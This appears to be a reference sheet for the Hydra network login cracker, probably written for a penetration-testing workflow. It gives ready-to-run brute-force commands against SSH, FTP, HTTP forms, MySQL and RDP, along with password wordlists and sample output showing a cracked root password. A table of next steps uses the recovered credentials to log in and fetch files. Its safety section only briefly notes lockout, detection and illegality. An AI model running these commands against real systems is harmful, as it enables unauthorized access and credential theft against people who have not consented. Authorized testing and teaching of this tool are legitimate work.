# Hydra - Network Login Cracker

## Overview
| Attribute | Value |
|-----------|-------|
| Binary | `hydra` |
| Category | Credential Brute-forcing |
| Risk Level | High |

## Description
Hydra is a fast and flexible online password cracking tool supporting numerous protocols including SSH, FTP, HTTP, MySQL, SMB, and many more.

---

## Supported Protocols
`ssh`, `ftp`, `http-get`, `http-post-form`, `https-get`, `https-post-form`, `smb`, `mysql`, `mssql`, `postgres`, `rdp`, `vnc`, `telnet`, `smtp`, `pop3`, `imap`, `ldap`, `snmp`, `redis`, `mongodb`, and more.

---

## Usage Patterns

### 1. SSH Brute-force
**Goal:** Crack SSH login.
```bash
hydra -l <username> -P <password_list> <target> ssh
```
**Example:**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
```

### 2. Multiple Users
**Goal:** Try multiple usernames.
```bash
hydra -L <user_list> -P <password_list> <target> ssh
```

### 3. FTP Brute-force
```bash
hydra -l admin -P passwords.txt <target> ftp
```

### 4. HTTP Basic Auth
```bash
hydra -l admin -P passwords.txt <target> http-get /admin
```

### 5. HTTP POST Form
**Goal:** Crack web login forms.
```bash
hydra -l <user> -P <passwords> <target> http-post-form "<path>:<post_data>:<fail_string>"
```
**Example:**
```bash
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```
- `^USER^`: Placeholder for username
- `^PASS^`: Placeholder for password
- Last field: String that appears on failed login

### 6. MySQL Brute-force
```bash
hydra -l root -P passwords.txt <target> mysql
```

### 7. RDP Brute-force
```bash
hydra -l administrator -P passwords.txt <target> rdp
```

---

## Important Options
| Flag | Description |
|------|-------------|
| `-l` | Single username |
| `-L` | Username list file |
| `-p` | Single password |
| `-P` | Password list file |
| `-t` | Parallel tasks (default: 16) |
| `-s` | Custom port |
| `-V` | Verbose (show each attempt) |
| `-f` | Stop on first valid password |
| `-o` | Output file |
| `-e nsr` | Try null/same/reverse passwords |

---

## Common Wordlists (Parrot OS)
| Path | Description |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | Classic password list (14M) |
| `/usr/share/wordlists/fasttrack.txt` | Fast common passwords |
| `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` | Top 10k passwords |

---

## Output Parsing

### Sample Output
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 10:30:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.10:22/
[STATUS] 128.00 tries/min, 128 tries in 00:01h, 14344271 to do in 1868:28h, 16 active
[22][ssh] host: 192.168.1.10   login: root   password: toor
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 10:35:22
```

### Parsing Rules
- `[port][protocol] host: ... login: ... password: ...` = **found credentials** (key line)
- `[STATUS]` lines = progress updates (tries/min, remaining time)
- `[ERROR]` lines = connection failures
- `valid password found` = success summary
- `-o` flag writes results to file for later reference

---

## Next Steps

| Finding | Recommended Next Tool | Example |
|---------|----------------------|---------|
| SSH credentials found | Direct SSH login | `ssh root@target` |
| HTTP credentials found | `curl` to access panel | `curl -u admin:pass http://target/admin` |
| FTP credentials found | FTP login for file access | `curl ftp://target -u user:pass` |
| No valid passwords | Try larger wordlist or `cewl` | `cewl -d 3 -m 6 -w custom.txt http://target` |
| Account lockout hit | Reduce threads | `hydra ... -t 1` |

---

## Safety Warnings
| Risk | Description |
|------|-------------|
| **Account Lockout** | May trigger lockout policies |
| **Detection** | Easily detected by IDS/SIEM |
| **Legal** | Unauthorized access is illegal |

> **CRITICAL:** Use `-t 1` for services with lockout policies.

---

## Common Errors & Solutions
| Error | Cause | Solution |
|-------|-------|----------|
| `Connection refused` | Service down or wrong port | Verify port with nmap |
| `Too many connections` | Rate limiting | Reduce `-t` value |
| `Invalid protocol` | Unsupported service | Check `hydra -h` for protocols |
